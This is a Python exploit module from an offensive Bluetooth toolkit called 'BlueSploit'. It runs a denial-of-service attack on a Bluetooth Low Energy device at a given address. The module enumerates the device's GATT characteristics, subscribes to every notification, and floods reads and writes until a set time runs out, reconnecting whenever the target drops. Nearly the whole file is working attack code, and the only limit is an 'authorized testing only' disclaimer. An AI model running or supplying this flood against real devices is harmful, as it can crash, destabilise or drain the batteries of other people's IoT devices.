"""
BlueSploit Module: BLE Notification Flood DoS
Bluetooth Low Energy denial of service via notification subscription spam

Subscribes to all notify characteristics and floods the target
with rapid read/write requests to exhaust resources.

Author: v33ru
"""

import asyncio
import time
from typing import List, Dict
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    from bleak import BleakClient
    from bleak.exc import BleakError
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False


class Module(ExploitModule):
    """
    BLE Notification Flood DoS
    
    Attacks BLE devices by:
    1. Subscribing to all notification characteristics
    2. Flooding with rapid GATT read requests
    3. Sending continuous write requests to writable chars
    
    This can cause:
    - Resource exhaustion on constrained IoT devices
    - Battery drain
    - Firmware crashes
    - Connection instability
    
    DISCLAIMER: For authorized security testing only.
    """
    
    info = ModuleInfo(
        name="exploits/dos/ble/notify_flood",
        description="BLE Notification/GATT Flood DoS Attack",
        author=["v33ru"],
        protocol=BTProtocol.BLE,
        severity=Severity.MEDIUM,
        references=[
            "https://www.bluetooth.com/specifications/specs/core-specification/"
        ]
    )
    
    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target",
                required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)"
            ),
            "duration": ModuleOption(
                name="duration",
                required=False,
                description="Attack duration in seconds",
                default=60
            ),
            "mode": ModuleOption(
                name="mode",
                required=False,
                description="Attack mode: notify, read, write, or all",
                default="all"
            ),
            "reconnect": ModuleOption(
                name="reconnect",
                required=False,
                description="Auto-reconnect if disconnected",
                default=True
            ),
            "timeout": ModuleOption(
                name="timeout",
                required=False,
                description="Connection timeout in seconds",
                default=15
            )
        }
    
    async def _enumerate_characteristics(self, client: BleakClient) -> Dict:
        """Enumerate all characteristics"""
        chars = {
            "notify": [],
            "read": [],
            "write": []
        }
        
        for service in client.services:
            for char in service.characteristics:
                props = list(char.properties)
                
                if "notify" in props or "indicate" in props:
                    chars["notify"].append(char.uuid)
                if "read" in props:
                    chars["read"].append(char.uuid)
                if "write" in props or "write-without-response" in props:
                    chars["write"].append(char.uuid)
        
        return chars
    
    async def _subscribe_all(self, client: BleakClient, notify_chars: List[str],
                            stats: Dict) -> None:
        """Subscribe to all notify characteristics"""
        def notification_handler(sender, data):
            stats["notifications"] += 1
        
        for uuid in notify_chars:
            try:
                await client.start_notify(uuid, notification_handler)
                stats["subscribed"] += 1
            except Exception:
                pass
    
    async def _flood_reads(self, client: BleakClient, read_chars: List[str],
                          stop_time: float, stats: Dict) -> None:
        """Flood with read requests"""
        idx = 0
        while time.time() < stop_time and client.is_connected:
            uuid = read_chars[idx % len(read_chars)]
            idx += 1
            
            try:
                await client.read_gatt_char(uuid)
                stats["reads"] += 1
            except Exception:
                stats["read_errors"] += 1
            
            # Small delay to avoid overwhelming local stack
            await asyncio.sleep(0.01)
    
    async def _flood_writes(self, client: BleakClient, write_chars: List[str],
                           stop_time: float, stats: Dict) -> None:
        """Flood with write requests"""
        idx = 0
        payloads = [
            bytes([0x00]),
            bytes([0x01]),
            bytes([0xFF]),
            bytes([0x41] * 20),
            bytes([0x00] * 20),
        ]
        
        while time.time() < stop_time and client.is_connected:
            uuid = write_chars[idx % len(write_chars)]
            payload = payloads[idx % len(payloads)]
            idx += 1
            
            try:
                await client.write_gatt_char(uuid, payload, response=False)
                stats["writes"] += 1
            except Exception:
                stats["write_errors"] += 1
            
            await asyncio.sleep(0.01)
    
    async def _attack_async(self, target: str, duration: int, mode: str,
                           reconnect: bool, timeout: int) -> Dict:
        """Execute async attack"""
        stats = {
            "subscribed": 0,
            "notifications": 0,
            "reads": 0,
            "read_errors": 0,
            "writes": 0,
            "write_errors": 0,
            "reconnects": 0,
            "connected": False
        }
        
        stop_time = time.time() + duration
        C = Colors
        
        while time.time() < stop_time:
            try:
                print_info(f"Connecting to {target}...")
                
                async with BleakClient(target, timeout=timeout) as client:
                    if not client.is_connected:
                        print_error("Failed to connect")
                        if reconnect:
                            await asyncio.sleep(2)
                            continue
                        return stats
                    
                    stats["connected"] = True
                    print_success("Connected!")
                    
                    # Enumerate characteristics
                    chars = await self._enumerate_characteristics(client)
                    print_info(f"Found: {len(chars['notify'])} notify, {len(chars['read'])} read, {len(chars['write'])} write")
                    
                    # Subscribe to notifications
                    if mode in ["notify", "all"] and chars["notify"]:
                        print_info("Subscribing to notifications...")
                        await self._subscribe_all(client, chars["notify"], stats)
                        print_success(f"Subscribed to {stats['subscribed']} characteristics")
                    
                    print_info("Starting flood attack...")
                    
                    # Create flood tasks
                    tasks = []
                    
                    if mode in ["read", "all"] and chars["read"]:
                        tasks.append(self._flood_reads(client, chars["read"], stop_time, stats))
                    
                    if mode in ["write", "all"] and chars["write"]:
                        tasks.append(self._flood_writes(client, chars["write"], stop_time, stats))
                    
                    if not tasks:
                        # Just wait and collect notifications
                        while time.time() < stop_time and client.is_connected:
                            elapsed = time.time() - (stop_time - duration)
                            remaining = stop_time - time.time()
                            
                            status = f"Notifications: {stats['notifications']} | Reads: {stats['reads']} | Writes: {stats['writes']}"
                            print(f"\r  {C.CYAN}[{status} | {remaining:.0f}s left]{C.RESET}    ", end='', flush=True)
                            
                            await asyncio.sleep(1)
                    else:
                        # Run flood tasks with monitoring
                        async def monitor():
                            while time.time() < stop_time:
                                remaining = stop_time - time.time()
                                status = f"Notif: {stats['notifications']} | Reads: {stats['reads']} | Writes: {stats['writes']}"
                                print(f"\r  {C.CYAN}[{status} | {remaining:.0f}s left]{C.RESET}    ", end='', flush=True)
                                await asyncio.sleep(1)
                        
                        tasks.append(monitor())
                        await asyncio.gather(*tasks, return_exceptions=True)
                    
                    print()
                    
            except BleakError as e:
                print()
                if "disconnected" in str(e).lower():
                    print_warning("Disconnected - target may have crashed!")
                    if reconnect and time.time() < stop_time:
                        stats["reconnects"] += 1
                        print_info("Attempting reconnect...")
                        await asyncio.sleep(2)
                        continue
                else:
                    print_error(f"BLE error: {e}")
                    if not reconnect:
                        break
            except Exception as e:
                print()
                print_error(f"Error: {e}")
                if not reconnect:
                    break
                await asyncio.sleep(2)
        
        return stats
    
    def _print_results(self, target: str, stats: Dict, duration: float) -> None:
        """Print attack results"""
        C = Colors
        
        total_ops = stats["reads"] + stats["writes"] + stats["notifications"]
        ops_per_sec = total_ops / duration if duration > 0 else 0
        
        print(f"\n  {C.CYAN}{'='*70}{C.RESET}")
        print(f"  {C.BOLD}{C.WHITE}BLE NOTIFICATION FLOOD RESULTS{C.RESET}")
        print(f"  {C.CYAN}{'='*70}{C.RESET}")
        print(f"  Target            : {C.WHITE}{target}{C.RESET}")
        print(f"  Connected         : {C.GREEN if stats['connected'] else C.RED}{'Yes' if stats['connected'] else 'No'}{C.RESET}")
        print(f"  Subscribed        : {stats['subscribed']} characteristics")
        print(f"  Notifications Rx  : {C.YELLOW}{stats['notifications']}{C.RESET}")
        print(f"  Read Requests     : {stats['reads']} (errors: {stats['read_errors']})")
        print(f"  Write Requests    : {stats['writes']} (errors: {stats['write_errors']})")
        print(f"  Reconnects        : {stats['reconnects']}")
        print(f"  Duration          : {duration:.2f} seconds")
        print(f"  Operations/sec    : {ops_per_sec:.1f}")
        
        if stats['reconnects'] > 0:
            print(f"\n  {C.YELLOW}[*] Target disconnected {stats['reconnects']} times - possible crash/instability{C.RESET}")
        
        if stats['write_errors'] > stats['writes'] // 2:
            print(f"\n  {C.YELLOW}[*] High write error rate - target may be overwhelmed{C.RESET}")
        
        print(f"\n  {C.CYAN}{'='*70}{C.RESET}\n")
    
    def run(self) -> bool:
        """Execute BLE notification flood"""
        
        if not BLEAK_AVAILABLE:
            print_error("Bleak library not installed!")
            print_info("Install with: pip install bleak")
            return False
        
        target = self.target
        duration = int(self.get_option("duration"))
        mode = self.get_option("mode")
        reconnect = self.get_option("reconnect")
        timeout = int(self.get_option("timeout"))
        
        # Validate
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        
        if mode not in ["notify", "read", "write", "all"]:
            print_error(f"Invalid mode: {mode}")
            return False
        
        # Print attack info
        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}BLE Notification/GATT Flood DoS{C.RESET}                            {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")
        
        print_info(f"Target      : {target}")
        print_info(f"Duration    : {duration}s")
        print_info(f"Mode        : {mode}")
        print_info(f"Reconnect   : {reconnect}")
        
        print()
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_info("Starting in 3 seconds... (Ctrl+C to stop)")
        
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print_warning("Cancelled")
            return False
        
        start_time = time.time()
        
        try:
            stats = asyncio.run(self._attack_async(target, duration, mode, reconnect, timeout))
        except KeyboardInterrupt:
            print()
            print_warning("Interrupted by user")
            stats = {"connected": False, "subscribed": 0, "notifications": 0,
                    "reads": 0, "read_errors": 0, "writes": 0, "write_errors": 0, "reconnects": 0}
        
        actual_duration = time.time() - start_time
        self._print_results(target, stats, actual_duration)
        
        self.add_result({
            "target": target,
            "stats": stats,
            "duration": actual_duration
        })
        
        return stats.get("connected", False)
